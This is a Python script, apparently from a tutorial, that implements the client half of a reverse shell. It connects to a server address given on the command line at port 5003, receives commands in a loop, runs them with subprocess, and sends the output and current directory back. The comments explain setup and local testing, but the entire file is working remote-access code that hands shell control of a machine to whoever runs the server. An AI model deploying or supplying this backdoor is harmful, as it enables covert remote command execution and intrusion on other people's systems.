import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"


# Above, we're setting the SERVER_HOST to be passed from the command line arguments,
# this is the IP or host of the server machine. If you're on a local network, 
# then you should know the private IP
# of the server by using the command ipconfig on Windows and ifconfig on Linux.
# Note that if you're testing both codes on the same machine, 
# you can set the SERVER_HOST to 127.0.0.1 and it will work just fine.



# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))


# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())


# First, we receive the command from the server using recv() method on the socket object,
# we then check if it's a cd command, if that's the case, then we use the os.chdir()
# function to change the directory, that's because subprocess.getoutput()
# spawns its own process and does not change the directory on the current 
# Python process.



while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
# close client connection
s.close()